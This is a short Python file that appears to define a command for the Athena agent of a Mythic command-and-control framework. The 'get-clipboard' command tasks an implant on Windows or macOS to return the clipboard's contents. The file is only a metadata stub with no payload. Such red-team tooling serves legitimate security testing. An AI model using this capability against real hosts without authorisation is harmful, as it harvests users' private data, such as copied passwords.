from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class GetClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = []

    async def parse_arguments(self):
        pass


class GetClipboardCommand(CommandBase):
    cmd = "get-clipboard"
    needs_admin = False
    help_cmd = "get-clipboard"
    description = "Tasks Athena to return the contents of the clipboard."
    version = 1
    supported_ui_features = []
    author = "@checkymander"
    attackmapping = []
    argument_class = GetClipboardArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows, SupportedOS.MacOS]
    )
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

